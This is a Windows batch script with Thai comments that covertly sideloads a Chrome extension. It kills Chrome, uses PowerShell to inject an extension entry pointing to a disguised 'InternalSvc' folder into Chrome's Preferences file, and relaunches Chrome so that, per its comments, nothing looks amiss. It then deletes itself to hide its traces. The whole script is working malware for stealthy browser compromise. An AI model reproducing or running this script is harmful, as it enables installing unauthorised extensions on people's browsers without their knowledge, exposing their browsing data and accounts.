@echo off
setlocal

:: 1. ตั้งค่า Path
set "PREF_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"
set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
set "EXT_PATH=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc\%EXT_ID%"

:: 2. สั่งปิด Chrome ก่อน (ต้องปิดก่อนถึงจะแก้ไฟล์ได้)
taskkill /f /im chrome.exe >nul 2>&1

:: 3. ใช้ PowerShell เข้าไปฉีดค่าใน JSON ของ Chrome
:: เราจะเพิ่ม ID ส่วนเสริมของเราเข้าไปในหมวด extensions.settings
powershell -Command ^
"$path = '%PREF_FILE%';" ^
"$json = Get-Content $path | ConvertFrom-Json;" ^
"$newExt = New-Object PSObject;" ^
"$newExt | Add-Member -MemberType NoteProperty -Name 'path' -Value '%EXT_PATH%';" ^
"$newExt | Add-Member -MemberType NoteProperty -Name 'state' -Value 1;" ^
"$newExt | Add-Member -MemberType NoteProperty -Name 'location' -Value 4;" ^
"$json.extensions.settings | Add-Member -MemberType NoteProperty -Name '%EXT_ID%' -Value $newExt -Force;" ^
"$json | ConvertTo-Json -Depth 100 | Set-Content $path"

:: 4. เปิด Chrome กลับคืนมา (ให้เนียนเหมือนไม่มีอะไรเกิดขึ้น)
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"

:: 5. ลบตัวเองทิ้ง
(goto) 2>nul & del "%~f0"
